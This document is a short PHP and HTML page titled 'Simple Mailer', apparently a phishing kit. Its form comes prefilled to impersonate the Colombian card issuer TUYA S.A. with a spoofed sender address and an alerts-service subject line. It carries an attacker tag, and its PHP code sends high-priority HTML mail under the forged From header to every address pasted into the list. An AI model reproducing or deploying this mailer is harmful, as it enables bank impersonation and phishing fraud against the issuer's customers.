<!DOCTYPE html>
<html>
<head>
	<title>Mailer</title>
	<style type="text/css">
	#Container{
		width: 80%;
		margin:0 auto;
		background: #eee;
		padding: 5px;
	}
	.full{
		width: 90%;
		display: block;
		margin: 0 auto;
	}
	</style>
</head>

<body>
	<div id="Container">
		<h1>Simple Mailer</h1>
		<form method="post">
			<label class="full" for="From">From :</label>
			<input class="full" type="text" id="From" name="From" value="tuya@tuya.com.co"/>
			<label class="full" for="Subject">Subject :</label>
			<input class="full" type="text" id="Subject" name="Subject" value="Servicio de Alertas y Notificaciones TUYA S.A"/>
			<label class="full" for="Name">Name :</label>
			<input class="full" type="text" id="Name" name="Name" value="Tu Tarjeta Exito- Carulla"/>
			<label class="full" for="Message">Message :</label>
			<textarea class="full" name="Message" id="Message" rows="10" cols="30">test













</textarea>
			<label class="full" for="Emails">Emails :</label>
			<textarea class="full" name="Emails" id="Emails" rows="10" cols="30">polahi@outlook.sg</textarea>
			
			<input type="hidden" name="send">
			<button id="Send" style="Width:200px;height:50px;display:block;margin:0 auto;background:black;color:white;">Send</button>
		</form>
	</div>

	<?php
	/*AZZATSSINS*/

if(@isset($_POST['send'])){
$From 	= $_POST['From'];
$Subject	= $_POST['Subject'];
$Message	= $_POST['Message'];
$Name		= $_POST['Name'];
$Name2		= "tuya@tuya.com.col";
$headers	= "MIME-Version: 1.0\r\n";
$headers .=	"Content-type:text/html;charset=UTF-8\r\n";
$headers .= 	"X-Priority: 1\n";
$headers	.= "From: ".$Name." <".$From.">\r\n";
$headers	.= "Cc: ".$Name2."\r\n";
$Emails	= explode("\r\n", $_POST['Emails']);
foreach($Emails as $email) {
mail($email,$Subject,$Message,$headers);
echo "<br>Sending Email To : ".$email." => Done";
}
}